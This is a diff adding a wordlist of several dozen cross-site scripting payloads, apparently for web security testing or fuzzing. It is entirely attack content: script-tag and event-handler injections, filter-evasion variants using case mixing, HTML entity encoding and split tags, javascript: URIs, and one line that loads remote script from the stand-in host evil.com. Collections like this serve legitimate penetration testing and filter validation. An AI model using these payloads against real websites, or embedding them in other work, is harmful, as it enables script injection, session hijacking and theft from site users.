@@ -1,0 +1,47 @@
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<details open ontoggle=alert(1)>
+"'><script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<scr<script>ipt>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+javascript:alert(1)
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+-alert(1)-
+';alert(1)//
+";alert(1)//
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=alert`1`>
+<svg/onload=alert(1)>
+<math><maction actiontype="statusline#http://evil">alert(1)</maction>
+<image src=x onerror=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<BODY ONLOAD=alert(1)>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<IMG SRC=javascript:alert(1)>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000049&#0000041>
+<IMG SRC="jav&#x09;ascript:alert(1);">
+<IMG SRC="jav&#x0A;ascript:alert(1);">
+<IMG SRC=" &#14; javascript:alert(1);">
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<a href="javascript:alert(1)">x</a>
+<div style="background:url(javascript:alert(1))">
